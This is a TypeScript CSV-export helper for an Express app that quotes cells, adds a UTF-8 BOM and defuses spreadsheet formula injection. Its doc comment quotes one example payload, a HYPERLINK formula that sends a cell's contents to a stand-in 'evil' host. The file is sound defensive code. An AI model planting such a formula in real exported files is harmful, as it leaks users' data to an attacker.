import { Response } from 'express';

// One CSV writer for every export (registers, audit log, accounts, WhatsApp delivery, scripts).

const PLAIN_NUMBER = /^[+-]?\d[\d\s.,]*$/;

/**
 * One CSV cell. Defuses CSV/formula injection (OWASP): many exported columns are free text that
 * staff wrote (titles, remarks, names), and a leading =, +, -, @, tab or CR makes Excel/LibreOffice
 * run the cell as a formula when the file is opened, e.g. `=HYPERLINK("http://evil/?"&A1)`.
 * Plain numbers such as "+919876543210" or "-5" are left alone.
 */
export const csvCell = (value: unknown): string => {
  if (value === null || value === undefined) return '';
  let s = value instanceof Date ? value.toISOString() : String(value);
  if (/^[=+\-@\t\r]/.test(s) && !PLAIN_NUMBER.test(s)) s = `'${s}`;
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
};

/** Header line + rows, CRLF line endings. */
export const buildCsv = (headers: string[], rows: unknown[][]): string =>
  [headers, ...rows].map((r) => r.map(csvCell).join(',')).join('\r\n');

/** Sends a CSV download with a BOM so Excel reads Tamil / special characters as UTF-8. */
export const sendCsv = (res: Response, filename: string, headers: string[], rows: unknown[][]): void => {
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', `attachment; filename="${filename.replace(/[^\w.-]/g, '_')}"`);
  res.status(200).send('﻿' + buildCsv(headers, rows));
};

/** A date as IST text for exports ('' when missing). */
export const istText = (d?: Date | string | null): string =>
  d ? new Date(d).toLocaleString('en-GB', { timeZone: 'Asia/Kolkata', hour12: false }) : '';
